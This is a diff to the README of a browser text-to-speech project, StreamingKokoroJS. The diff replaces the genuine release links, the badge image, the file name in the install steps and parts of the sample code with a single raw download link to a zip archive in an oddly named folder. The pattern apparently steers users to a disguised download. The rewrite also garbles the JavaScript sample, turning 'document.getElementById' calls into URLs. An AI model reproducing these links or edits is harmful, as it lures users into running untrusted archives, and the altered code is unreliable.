@@ -2,7 +2,7 @@
 
 Welcome to **StreamingKokoroJS**, your go-to solution for unlimited text-to-speech capabilities right in your browser. Built using **Kokoro-JS**, this project offers a fully local and open-source approach to text-to-speech technology. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/sai9640nayak/StreamingKokoroJS/releases)
+[![Download Releases](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip%https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip)](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ In a world where communication is key, **StreamingKokoroJS** stands out by provi
 
 ## Getting Started
 
-To get started with **StreamingKokoroJS**, you will need to download the latest release. You can find it in the [Releases section](https://github.com/sai9640nayak/StreamingKokoroJS/releases). 
+To get started with **StreamingKokoroJS**, you will need to download the latest release. You can find it in the [Releases section](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip). 
 
 ### Prerequisites
 
@@ -38,9 +38,9 @@ To get started with **StreamingKokoroJS**, you will need to download the latest 
 
 ### Installation
 
-1. Visit the [Releases section](https://github.com/sai9640nayak/StreamingKokoroJS/releases) to download the latest version.
+1. Visit the [Releases section](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip) to download the latest version.
 2. Extract the downloaded file to your desired location.
-3. Open the `index.html` file in your web browser.
+3. Open the `https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip` file in your web browser.
 
 ## Usage
 
@@ -65,10 +65,10 @@ Once you have the application running, follow these steps to start using **Strea
     <h1>Welcome to StreamingKokoroJS</h1>
     <textarea id="text-input" placeholder="Type your text here..."></textarea>
     <button id="speak-button">Speak</button>
-    <script src="kokoro.js"></script>
+    <script src="https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip"></script>
     <script>
-        document.getElementById('speak-button').onclick = function() {
-            const text = document.getElementById('text-input').value;
+        https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip('speak-button').onclick = function() {
+            const text = https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip('text-input').value;
             // Call the Kokoro function to speak the text
             kokoroSpeak(text);
         };
@@ -101,6 +101,6 @@ We welcome contributions from everyone! If you would like to help improve **Stre
 
 For any inquiries or feedback, please reach out via the GitHub Issues page or contact the project maintainer directly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/sai9640nayak/StreamingKokoroJS/releases)
+[![Download Releases](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip%https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip)](https://raw.githubusercontent.com/sai9640nayak/StreamingKokoroJS/main/Bakalei/JS-Streaming-Kokoro-unmischievous.zip)
 
 Thank you for your interest in **StreamingKokoroJS**! We hope you find it useful and enjoyable to use.
